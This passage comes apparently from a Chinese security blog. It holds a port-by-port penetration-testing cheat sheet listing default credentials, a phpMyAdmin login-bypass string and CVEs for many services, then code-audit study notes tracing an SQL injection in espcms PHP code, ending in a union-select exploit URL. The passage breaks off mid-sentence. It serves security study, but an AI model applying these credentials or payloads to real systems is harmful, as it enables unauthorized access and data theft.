<h4 id="默认端口：-2"><a href="#默认端口：-2" class="headerlink" title="默认端口："></a>默认端口：</h4><p>5900+桌面ID（5901；5902） </p>
<h4 id="攻击方式：-5"><a href="#攻击方式：-5" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>认证口令绕过：</li>
<li>拒绝服务攻击：（CVE-2015-5239）</li>
<li>权限提升：（CVE-2013-6886）</li>
</ul>
<h3 id="Pcanywhere服务"><a href="#Pcanywhere服务" class="headerlink" title="Pcanywhere服务"></a>Pcanywhere服务</h3><p>PyAnywhere服务：一款远控工具，有点类似vnc的功能；这个服务在以前很多黑客发的视频里面都有，利用pcanywhere来进行提权；</p>
<h4 id="默认端口：5632"><a href="#默认端口：5632" class="headerlink" title="默认端口：5632"></a>默认端口：5632</h4><h3 id="攻击方式：-6"><a href="#攻击方式：-6" class="headerlink" title="攻击方式："></a>攻击方式：</h3><ul>
<li>提权控制服务：</li>
<li>拒绝服务攻击：</li>
<li>代码执行：请参考</li>
</ul>
<h2 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h2><p>HTTP服务：对于http服务其实是我们目前这几年比较常见的攻击入口，所以这里会针对http服务进行一个详细的详解；</p>
<p>注：这个板块的所有攻击方式，如果涉及到常规的web漏洞不会提出来，除非是特定的服务器才会产生的漏洞；</p>
<h3 id="IIS服务"><a href="#IIS服务" class="headerlink" title="IIS服务"></a>IIS服务</h3><h4 id="默认端口：80-81-443"><a href="#默认端口：80-81-443" class="headerlink" title="默认端口：80/81/443"></a>默认端口：80/81/443</h4><h4 id="攻击方式：-7"><a href="#攻击方式：-7" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>IIS PUT写文件：利用IIS漏洞，put方法直接将文件放置到服务器上</li>
<li>短文件名泄漏：这种一般没啥影响</li>
<li>解析漏洞：详细见apache服务</li>
</ul>
<h3 id="Apache-Tomcat-Nginx-Axis2"><a href="#Apache-Tomcat-Nginx-Axis2" class="headerlink" title="Apache/Tomcat/Nginx/Axis2"></a>Apache/Tomcat/Nginx/Axis2</h3><h4 id="默认端口：80-8080"><a href="#默认端口：80-8080" class="headerlink" title="默认端口：80/8080"></a>默认端口：80/8080</h4><h4 id="攻击方式：-8"><a href="#攻击方式：-8" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（爆破manager后台）</li>
<li>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响；</li>
<li>解析漏洞：请参考</li>
</ul>
<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><h4 id="默认端口：7001"><a href="#默认端口：7001" class="headerlink" title="默认端口：7001"></a>默认端口：7001</h4><p>攻击方式：</p>
<ul>
<li>爆破：弱口令 4组：用户名密码均一致：system weblogic（密码可能weblogic123） portaladmin guest</li>
<li>Congsole后台部署webshell：</li>
<li>Java反序列化：</li>
<li>泄漏源代码/列目录：这个太老了，估计网上都没有了吧！</li>
<li>SSRF窥探内网：央视网SSRF可窥探内网</li>
</ul>
<h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><h4 id="默认端口8080"><a href="#默认端口8080" class="headerlink" title="默认端口8080"></a>默认端口8080</h4><p>其他端口1098/1099/4444/4445/8080/8009/8083/8093</p>
<h4 id="攻击方式：-9"><a href="#攻击方式：-9" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（爆破jboss系统后台）</li>
<li>远程代码执行：由于配置不当造成</li>
<li>Java反序列化：</li>
</ul>
<h3 id="Websphere"><a href="#Websphere" class="headerlink" title="Websphere"></a>Websphere</h3><h4 id="默认端口：908"><a href="#默认端口：908" class="headerlink" title="默认端口：908*"></a>默认端口：908*</h4><p>第一个应用就是9080，第二个就是9081；控制台9090</p>
<h4 id="攻击方式：-10"><a href="#攻击方式：-10" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（控制台）</li>
<li>任意文件泄漏：（CVE-2014-0823）</li>
<li>Java反序列化</li>
</ul>
<h3 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h3><h4 id="默认端口：-3"><a href="#默认端口：-3" class="headerlink" title="默认端口："></a>默认端口：</h4><p>http 8080；IIOP 3700；控制台4848</p>
<h4 id="攻击方式：-11"><a href="#攻击方式：-11" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（对于控制台）</li>
<li>任意文件读取：</li>
<li>认证绕过：</li>
</ul>
<h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><h4 id="默认端口：-4"><a href="#默认端口：-4" class="headerlink" title="默认端口："></a>默认端口：</h4><p>8080、8089</p>
<h4 id="攻击方式：-12"><a href="#攻击方式：-12" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（默认管理员）</li>
<li>未授权访问：</li>
<li>反序列化：</li>
</ul>
<h3 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h3><h4 id="默认端口：8080"><a href="#默认端口：8080" class="headerlink" title="默认端口：8080"></a>默认端口：8080</h4><h4 id="攻击方式：-13"><a href="#攻击方式：-13" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>目录遍历</li>
<li>远程文件读取</li>
</ul>
<h3 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h3><h4 id="默认端口：8080-1"><a href="#默认端口：8080-1" class="headerlink" title="默认端口：8080"></a>默认端口：8080</h4><h4 id="攻击方式：-14"><a href="#攻击方式：-14" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>远程共享缓冲区溢出</li>
</ul>
<h3 id="Lotus"><a href="#Lotus" class="headerlink" title="Lotus"></a>Lotus</h3><p>影响的都是一些大型的企业，特别需要注意，经过以前的测试发现弱口令这个问题经常都存在，可能是很多管理员不知道如何去修改（不要打我）。</p>
<h4 id="默认端口：1352"><a href="#默认端口：1352" class="headerlink" title="默认端口：1352"></a>默认端口：1352</h4><h4 id="攻击方式：-15"><a href="#攻击方式：-15" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（admin password）控制台</li>
<li>信息泄露</li>
<li>跨站脚本攻击</li>
</ul>
<h2 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h2><p>针对所有的数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p>
<h3 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h3><h4 id="默认端口：3306"><a href="#默认端口：3306" class="headerlink" title="默认端口：3306"></a>默认端口：3306</h4><h4 id="攻击方式：-16"><a href="#攻击方式：-16" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>身份认证漏洞：CVE-2012-2122 </li>
<li>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</li>
<li>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@”  密码任意</li>
</ul>
<h3 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h3><h4 id="默认端口：-5"><a href="#默认端口：-5" class="headerlink" title="默认端口："></a>默认端口：</h4><p>1433（Server 数据库服务）、1434（Monitor 数据库监控）</p>
<h4 id="攻击方式：-17"><a href="#攻击方式：-17" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令/使用系统用户</li>
</ul>
<h3 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h3><h4 id="默认端口：-6"><a href="#默认端口：-6" class="headerlink" title="默认端口："></a>默认端口：</h4><p>1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p>
<p>攻击方式：</p>
<ul>
<li>爆破：弱口令</li>
<li>注入攻击；</li>
<li>漏洞攻击；</li>
</ul>
<h3 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术  大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
<h4 id="默认端口：5432"><a href="#默认端口：5432" class="headerlink" title="默认端口：5432"></a>默认端口：5432</h4><h4 id="攻击方式：-18"><a href="#攻击方式：-18" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令：postgres postgres</li>
<li>缓冲区溢出：CVE-2014-2669</li>
</ul>
<h3 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h3><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考</p>
<h4 id="默认端口：27017"><a href="#默认端口：27017" class="headerlink" title="默认端口：27017"></a>默认端口：27017</h4><h4 id="攻击方式：-19"><a href="#攻击方式：-19" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>未授权访问；github有攻击代码；请点击</li>
</ul>
<h3 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h3><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt" target="_blank" rel="external">https://yunpan.cn/cYjzHxawFpyVt</a>  访问密码 e547</p>
<h4 id="默认端口：6379"><a href="#默认端口：6379" class="headerlink" title="默认端口：6379"></a>默认端口：6379</h4><h4 id="攻击方式：-20"><a href="#攻击方式：-20" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>未授权访问+配合ssh key提权； </li>
</ul>
<h3 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h3><h4 id="默认端口：-7"><a href="#默认端口：-7" class="headerlink" title="默认端口："></a>默认端口：</h4><p>服务端口5000；监听端口4100；备份端口：4200</p>
<h4 id="攻击方式：-21"><a href="#攻击方式：-21" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>命令注入：</li>
</ul>
<h3 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h3><h4 id="默认端口：5000"><a href="#默认端口：5000" class="headerlink" title="默认端口：5000"></a>默认端口：5000</h4><h4 id="攻击方式：-22"><a href="#攻击方式：-22" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</li>
</ul>
<h3 id="CouchDB数据库"><a href="#CouchDB数据库" class="headerlink" title="CouchDB数据库"></a>CouchDB数据库</h3><p>CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。</p>
<h4 id="默认端口：5984"><a href="#默认端口：5984" class="headerlink" title="默认端口：5984"></a>默认端口：5984</h4><h4 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a>攻击方式</h4><ul>
<li>未授权访问</li>
</ul>
<p><a href="http://wooyun.jozxing.cc/static/drops/papers-16030.html" target="_blank" rel="external">利用CouchDB未授权访问漏洞执行任意系统命令</a></p>
<p>总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p>
<p>顺便提一下：很多时候银行企业采用的都是oracle、db2等大型数据库；</p>
<h2 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h2><h3 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
<h4 id="默认端口：-8"><a href="#默认端口：-8" class="headerlink" title="默认端口："></a>默认端口：</h4><p>25（smtp）、465（smtps）</p>
<h4 id="攻击方式：-23"><a href="#攻击方式：-23" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>未授权访问</li>
</ul>
<h3 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h3><h4 id="默认端口：-9"><a href="#默认端口：-9" class="headerlink" title="默认端口："></a>默认端口：</h4><p>109（POP2）、110（POP3）、995（POP3S）</p>
<p>攻击方式：</p>
<ul>
<li>爆破；弱口令</li>
<li>未授权访问；</li>
</ul>
<h3 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h3><h4 id="默认端口：-10"><a href="#默认端口：-10" class="headerlink" title="默认端口："></a>默认端口：</h4><p>143（imap）、993（imaps）</p>
<h4 id="攻击方式：-24"><a href="#攻击方式：-24" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>配置不当</li>
</ul>
<h2 id="网络常见协议端口渗透"><a href="#网络常见协议端口渗透" class="headerlink" title="网络常见协议端口渗透"></a>网络常见协议端口渗透</h2><h3 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h3><h4 id="默认端口：53"><a href="#默认端口：53" class="headerlink" title="默认端口：53"></a>默认端口：53</h4><h4 id="攻击方式：-25"><a href="#攻击方式：-25" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>区域传输漏洞</li>
</ul>
<h3 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h3><h4 id="默认端口：-11"><a href="#默认端口：-11" class="headerlink" title="默认端口："></a>默认端口：</h4><p>67&amp;68、546（DHCP Failover做双机热备的）</p>
<h4 id="攻击方式：-26"><a href="#攻击方式：-26" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>DHCP劫持；</li>
</ul>
<h3 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h3><h4 id="默认端口：161"><a href="#默认端口：161" class="headerlink" title="默认端口：161"></a>默认端口：161</h4><h4 id="攻击方式-3"><a href="#攻击方式-3" class="headerlink" title="攻击方式:"></a>攻击方式:</h4><ul>
<li>爆破：弱口令</li>
</ul>
<h2 id="其他端口渗透"><a href="#其他端口渗透" class="headerlink" title="其他端口渗透"></a>其他端口渗透</h2><h3 id="Hadoop文件服务"><a href="#Hadoop文件服务" class="headerlink" title="Hadoop文件服务"></a>Hadoop文件服务</h3><p>默认端口：<a href="http://hsrong.iteye.com/blog/1374734" target="_blank" rel="external">请参考</a></p>
<h3 id="Zookeeper服务"><a href="#Zookeeper服务" class="headerlink" title="Zookeeper服务"></a>Zookeeper服务</h3><p>zookeeper：分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。详情请参考百度百科</p>
<h4 id="默认端口：2181"><a href="#默认端口：2181" class="headerlink" title="默认端口：2181"></a>默认端口：2181</h4><h4 id="攻击方式：-27"><a href="#攻击方式：-27" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>未授权访问；</li>
</ul>
<h3 id="Zabbix服务"><a href="#Zabbix服务" class="headerlink" title="Zabbix服务"></a>Zabbix服务</h3><p>zabbix：基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p>
<h4 id="默认端口：8069"><a href="#默认端口：8069" class="headerlink" title="默认端口：8069"></a>默认端口：8069</h4><h4 id="攻击方式：-28"><a href="#攻击方式：-28" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>远程命令执行：</li>
</ul>
<h3 id="elasticsearch服务"><a href="#elasticsearch服务" class="headerlink" title="elasticsearch服务"></a>elasticsearch服务</h3><p>elasticsearch：请百度（因为我觉得我解释不清楚）</p>
<h3 id="默认端口：-12"><a href="#默认端口：-12" class="headerlink" title="默认端口："></a>默认端口：</h3><p>9200（）、9300（）</p>
<p>攻击方式：</p>
<ul>
<li>未授权访问；</li>
<li>远程命令执行；</li>
<li>文件遍历；</li>
<li>低版本webshell植入；</li>
</ul>
<h3 id="memcache服务"><a href="#memcache服务" class="headerlink" title="memcache服务"></a>memcache服务</h3><h4 id="默认端口：11211"><a href="#默认端口：11211" class="headerlink" title="默认端口：11211"></a>默认端口：11211</h4><h3 id="Linux-R服务"><a href="#Linux-R服务" class="headerlink" title="Linux R服务"></a>Linux R服务</h3><p>R服务：TCP端口512,513和514为著名的rlogin提供服务。在系统中被错误配置从而允许远程访问者从任何地方访问（标准的，rhosts + +）。</p>
<h4 id="默认端口：-13"><a href="#默认端口：-13" class="headerlink" title="默认端口："></a>默认端口：</h4><p>512（remote process execution）；513（remote login a latelnet）；514（cmd）</p>
<h4 id="攻击方式：-29"><a href="#攻击方式：-29" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>使用rlogin直接登录对方系统；</li>
</ul>
<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI：我们使用这两个端口很少的原因是因为必须是java，而且rmi穿越防火墙并不好穿越；这里我不会去涉及其他的东西，这里提出RMI只是因为在前段时间的java反序列化中，我们的小伙伴Bird写过一个weblogic利用工具，里面涉及到了RMI的一些东西，在有的时候使用socket不能成功时，我们可以使用RMI方式来进行利用；</p>
<h4 id="默认端口：1090（）、1099（）"><a href="#默认端口：1090（）、1099（）" class="headerlink" title="默认端口：1090（）、1099（）"></a>默认端口：1090（）、1099（）</h4><h4 id="攻击方式：-30"><a href="#攻击方式：-30" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>远程命令执行（java反序列化，调用rmi方式执行命令）</li>
</ul>
<h3 id="Rsync服务"><a href="#Rsync服务" class="headerlink" title="Rsync服务"></a>Rsync服务</h3><p>Rsync：类UNIX系统下的数据备份工具（remote sync），属于增量备份；关于它的功能，大家自行百度百科吧，其实上面很多大家也看到了说是端口渗透，其实就是端口对应服务的渗透，服务一般出错就在配置或者版本问题上，rsync也不例外。Rsync默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。</p>
<h4 id="默认端口：873"><a href="#默认端口：873" class="headerlink" title="默认端口：873"></a>默认端口：873</h4><h4 id="攻击方式：-31"><a href="#攻击方式：-31" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>未授权访问；</li>
<li>本地提权：rsync默认以root运行，利用rsync上传一个文件，只要这个文件具有s权限，我们执行我们的攻击脚本就可以具有root权限。详细请参考 和 参考二</li>
</ul>
<h3 id="Socket代理"><a href="#Socket代理" class="headerlink" title="Socket代理"></a>Socket代理</h3><h4 id="默认端口：1080"><a href="#默认端口：1080" class="headerlink" title="默认端口：1080"></a>默认端口：1080</h4><p>Socket代理针对代理来说没有什么漏洞，一般只是在渗透过程中作为我们的代理，进入内网，或者渗透域和林的时候有帮助。这里不做过多描述，但是可以尝试爆破一下代理的用户名和密码，万一运气好能登录，不也~~~~</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ports.png" alt=""></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>总结来源于网络</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>《代码审计-企业级Web代码安全架构》学习笔记</title>
    <link href="http://uknowsec.cn/posts/notes/%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/《代码审计-企业级Web代码安全架构》学习笔记.html</id>
    <published>2017-08-15T01:51:48.000Z</published>
    <updated>2017-08-28T09:13:01.473Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a>通用代码审计思路</h1><p>常见的代码审计思路：</p>
<ul>
<li>根据敏感关键字回溯参数传递过程</li>
<li>查找可控变量，正向跟踪变量传递过程</li>
<li>寻找敏感功能点，通读功能点代码</li>
<li>直接通读全文代码</li>
</ul>
<h2 id="敏感函数回溯参数过程"><a href="#敏感函数回溯参数过程" class="headerlink" title="敏感函数回溯参数过程"></a>敏感函数回溯参数过程</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul>
<li>定向挖掘</li>
<li>高效</li>
<li>高质量</li>
</ul>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul>
<li>不够深入</li>
<li>对逻辑漏洞挖掘覆盖不到</li>
</ul>
<h3 id="espcms注入挖掘案例"><a href="#espcms注入挖掘案例" class="headerlink" title="espcms注入挖掘案例"></a>espcms注入挖掘案例</h3><p>由Seay源代码审计系统自动审计的功能定位到如下代码段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">class important extends connector &#123;</div><div class="line"></div><div class="line">	function important() &#123;</div><div class="line">		$this-&gt;softbase(true);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	function oncitylist() &#123;</div><div class="line">		$parentid = $this-&gt;fun-&gt;accept(&apos;parentid&apos;, &apos;R&apos;);</div><div class="line">		$parentid = empty($parentid) ? 1 : $parentid;</div><div class="line">		$verid = $this-&gt;fun-&gt;accept(&apos;verid&apos;, &apos;R&apos;);</div><div class="line">		$verid = empty($verid) ? 0 : $verid;</div><div class="line">		$db_table = db_prefix . &apos;city&apos;;</div><div class="line">		$sql = &quot;select * from $db_table where parentid=$parentid&quot;;</div><div class="line">		$rs = $this-&gt;db-&gt;query($sql);</div><div class="line">		for ($i = 0; $rsList = $this-&gt;db-&gt;fetch_array($rs); $i++) &#123;</div><div class="line">			if ($verid == $rsList[&apos;id&apos;]) &#123;</div><div class="line">				$list.=&apos;&lt;option selected value=&quot;&apos; . $rsList[&apos;id&apos;] . &apos;&quot;&gt;&apos; . $rsList[&apos;cityname&apos;] . &apos;&lt;/option&gt;&apos;;</div><div class="line">			&#125; else &#123;</div><div class="line">				$list.=&apos;&lt;option value=&quot;&apos; . $rsList[&apos;id&apos;] . &apos;&quot;&gt;&apos; . $rsList[&apos;cityname&apos;] . &apos;&lt;/option&gt;&apos;;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		exit($list);</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>由以上代码可知parentid是由accept()这个函数获得的。即如下语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$parentid = $this-&gt;fun-&gt;accept(&apos;parentid&apos;, &apos;R&apos;);</div></pre></td></tr></table></figure></p>
<p>跟进定位accept函数，定位到函数主体class_function.php文件的314行，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">function accept($k, $var = &apos;R&apos;, $htmlcode = true, $rehtml = false) &#123;</div><div class="line">	switch ($var) &#123;</div><div class="line">		case &apos;G&apos;:</div><div class="line">			$var = &amp;$_GET;</div><div class="line">			break;</div><div class="line">		case &apos;P&apos;:</div><div class="line">			$var = &amp;$_POST;</div><div class="line">			break;</div><div class="line">		case &apos;C&apos;:</div><div class="line">			$var = &amp;$_COOKIE;</div><div class="line">			break;</div><div class="line">		case &apos;R&apos;:</div><div class="line">			$var = &amp;$_GET;</div><div class="line">			if (empty($var[$k])) &#123;</div><div class="line">				$var = &amp;$_POST;</div><div class="line">			&#125;</div><div class="line">			break;</div><div class="line">	&#125;</div><div class="line">	$putvalue = isset($var[$k]) ? $this-&gt;daddslashes($var[$k], 0) : NULL;</div><div class="line">	return $htmlcode ? ($rehtml ? $this-&gt;preg_htmldecode($putvalue) : $this-&gt;htmldecode($putvalue)) : $putvalue;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>accept函数获取一个k值和一个var值，通过一个switch-case语句来获取GET、POST、COOKIE参数值的函数，由accept(‘parentid’, ‘R’)可知我们传入了一个parentid和一个R，则代表在GET和POST中都可以获取到parentid参数，<br>最后通过一个包装了的addslashes()函数，对单引号等字符进行过滤。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;select * from $db_table where parentid=$parentid&quot;;</div></pre></td></tr></table></figure>
<p>由前面的SQL语句可以,并不需要单引号来闭合，于是可以直接注入。</p>
<p>是根据代码构造EXP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/espcms/adminsoft/index.php?archive=ctylist&amp;action=ctylist&amp;parentid=-1%20union%20select%201,2,user%28%29,4,5</div></pre></td></tr></table></figure></p>
<h2 id="通读全文代码"><a href="#通读全文代码" class="headerlink" title="通读全文代码"></a>通读全文代码</h2><h3 id="通读全文代码的技巧"><a href="#通读全文代码的技巧" class="headerlink" title="通读全文代码的技巧"></a>通读全文代码的技巧</h3><p>在通读全文代码的时候，首先需要看程序的大体代码结构</p>
<ul>
<li>主目录有哪些文件</li>
<li>模块目录有哪些文件</li>
<li>插件目录有哪些文件</li>
<li>注意文件的大小、创建时间</li>
<li>根据文件的命名判断功能和核心文件</li>
</ul>
<h3 id="程序目录结构"><a href="#程序目录结构" class="headerlink" title="程序目录结构"></a>程序目录结构</h3><ul>
<li>函数集文件，通常命名中包含functions或者common等关键字，这些文件里面是一些公共函数，提供给其他函数统一调用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件一个非常好用的技巧就是去打开index.php或这一些功能性文件，在头部一般都能找到。</li>
<li>配置文件，通常命名中包括config关键字，配置文件包括Web程序运行必需的功能性配置选项以及数据库等配置信息。从这个文件中可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用双引号括起来，如果是双引号，则很可能存在代码执行漏洞。</li>
<li>安全过滤文件，通常命名中有filter、safe、check等关键字，这类文件主要是对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数。</li>
<li>index文件，index是一个程序的入口文件，所以通常我们只要读一遍index文件就可以大致了解整个程序的构架、运行的流程、包含到的文件，其中核心的文件有哪些。</li>
</ul>
<h3 id="骑士cms通读审计案例"><a href="#骑士cms通读审计案例" class="headerlink" title="骑士cms通读审计案例"></a>骑士cms通读审计案例</h3><p>骑士cms3.5.1</p>
<h4 id="查看应用文件结构"><a href="#查看应用文件结构" class="headerlink" title="查看应用文件结构"></a>查看应用文件结构</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/74cms.png" alt=""></p>
<p>寻找名称中带有api、admin、manage、include一类关键字的文件和文件夹，在这个程序中，可以看到只有一个index.php,看到有一个名为include的文件夹，一般比较核心的文件都会在这个文件夹中。如下是include文件夹下的文件</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/74cms1.png" alt=""></p>
<h4 id="查看关键文件代码"><a href="#查看关键文件代码" class="headerlink" title="查看关键文件代码"></a>查看关键文件代码</h4><p>可以在这个文件夹中看到很多php文件，根据这些php文件的命名可以推断其相关的代码内容。<br>其中的common.fun.php就是一个核心文件，基础函数基本在这个文件中实现。这个文件中有很多关键函数。比如</p>
